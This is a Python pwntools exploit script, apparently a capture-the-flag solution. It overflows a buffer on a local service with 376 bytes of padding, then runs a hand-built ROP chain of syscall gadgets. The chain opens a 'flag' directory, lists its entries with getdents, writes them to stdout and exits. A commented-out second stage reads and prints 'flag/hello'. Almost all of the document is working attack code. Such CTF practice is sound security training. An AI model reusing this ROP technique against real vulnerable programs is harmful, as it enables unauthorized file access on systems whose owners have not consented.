import sys
import struct
from pwn import *


def main(argv):

    PADDING = 376

    xor_rax = 0x000000000043caa9

    pop_rax = 0x00000000004474b7
    pop_rdi = 0x0000000000401a31
    pop_rsi = 0x000000000040890e
    pop_rdx = 0x000000000040176f


    mov_rdi_eax = 0x0000000000409f22

    syscall = 0x000000000045edea

    PAYLOAD = b""
    PAYLOAD += b"A" * PADDING # 17


    """
    Open "flag"
    """
    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000000004af000) # -> Start of .data
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x0067616c66) 
    PAYLOAD += p64(mov_rdi_eax) # -> Write "flag" in .data
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x00000002) # 0x2 : Open
    PAYLOAD += p64(pop_rdx)    
    PAYLOAD += p64(0x00000000) # NULL
    PAYLOAD += p64(pop_rsi)    
    PAYLOAD += p64(0x00000000) # NULL
    PAYLOAD += p64(syscall)

    """
    Getdents (from .)
    """
    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000005) # fd might change
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x0000004e) # 0x4e : Getdents
    PAYLOAD += p64(pop_rsi)
    PAYLOAD += p64(0x00000000004af000) # -> Start of .data, overwrite ;)
    PAYLOAD += p64(pop_rdx)
    PAYLOAD += p64(0x00000056) # -> For 0x56 bytes
    PAYLOAD += p64(syscall)

    """
    write getdents
    """

    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x00000001) # 0x1 : write
    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000001) # 1 : stdout
    PAYLOAD += p64(pop_rsi)
    PAYLOAD += p64(0x00000000004af000) # Start of .data
    PAYLOAD += p64(pop_rdx)
    PAYLOAD += p64(0x000000056) # Write 0x56 bytes

    PAYLOAD += p64(syscall) 

    # Clean exit (1337)
    PAYLOAD += p64(xor_rax)
    PAYLOAD += p64(pop_rax)
    PAYLOAD += p64(0x0000000000003c) # 0x3c : exit
    PAYLOAD += p64(pop_rdi)
    PAYLOAD += p64(0x00000000001337) # 1337 
    PAYLOAD += p64(syscall) 

    ## PART 2

    # """
    # Open "flag/hello"
    # """
    # PAYLOAD += p64(pop_rdi)
    # PAYLOAD += p64(0x00000000004af000) # Start of .data again
    # PAYLOAD += p64(pop_rax)
    # PAYLOAD += p64(0x67616c66) 
    # PAYLOAD += p64(mov_rdi_eax) # Write "flag"

    # PAYLOAD += p64(pop_rdi)
    # PAYLOAD += p64(0x00000000004af004) # Start of .data + 4
    # PAYLOAD += p64(pop_rax)
    # PAYLOAD += p64(0x6c65682f) 
    # PAYLOAD += p64(mov_rdi_eax) # Write "/hel"

    # PAYLOAD += p64(pop_rdi)
    # PAYLOAD += p64(0x00000000004af008) # Start of .data + 8
    # PAYLOAD += p64(pop_rax)
    # PAYLOAD += p64(0x6f6c)
    # PAYLOAD += p64(mov_rdi_eax) # Write "lo\0\0"

    # PAYLOAD += p64(pop_rdi)
    # PAYLOAD += p64(0x00000000004af000) # Start of our null terminated string

    # PAYLOAD += p64(pop_rax)
    # PAYLOAD += p64(0x00000002) # 0x2 : Open
    # PAYLOAD += p64(pop_rdx)    
    # PAYLOAD += p64(0x00000000) # NULL
    # PAYLOAD += p64(pop_rsi)    
    # PAYLOAD += p64(0x00000000) # NULL
    # PAYLOAD += p64(syscall)

    

    # """
    # read flag/hello
    # """
    # PAYLOAD += p64(pop_rax)
    # PAYLOAD += p64(0x00000000000000) # 0x0 : read
    # PAYLOAD += p64(pop_rdi)
    # PAYLOAD += p64(0x00000005) # fd might change
    # PAYLOAD += p64(pop_rsi)
    # PAYLOAD += p64(0x00000000004af000) # -> Overwrite start of .data
    # PAYLOAD += p64(pop_rdx)
    # PAYLOAD += p64(0x00000050) # read 0x50
    # PAYLOAD += p64(syscall)


    # """
    # write to stdout
    # """


    # PAYLOAD += p64(pop_rax)
    # PAYLOAD += p64(0x00000001) # 0x1 : write
    # PAYLOAD += p64(pop_rdi)
    # PAYLOAD += p64(0x00000001) # 1 : stdout
    # PAYLOAD += p64(pop_rsi)
    # PAYLOAD += p64(0x00000000004af000) # start of .data (containing the flag)
    # PAYLOAD += p64(pop_rdx)
    # PAYLOAD += p64(0x000000050) # 0x50
    # PAYLOAD += p64(syscall)

    # Exit
    # PAYLOAD += p64(xor_rax)
    # PAYLOAD += p64(pop_rax)
    # PAYLOAD += p64(0x0000000000003c) 
    # PAYLOAD += p64(pop_rdi)
    # PAYLOAD += p64(0x00000000001337)
    # PAYLOAD += p64(syscall)
    
    #p = process(['./y'])
    p = process(['nc', '127.0.0.1', '9002'])
    print(p.clean())
    p.sendline(PAYLOAD)
    print(p.clean())

if __name__ == "__main__":
    main(sys.argv)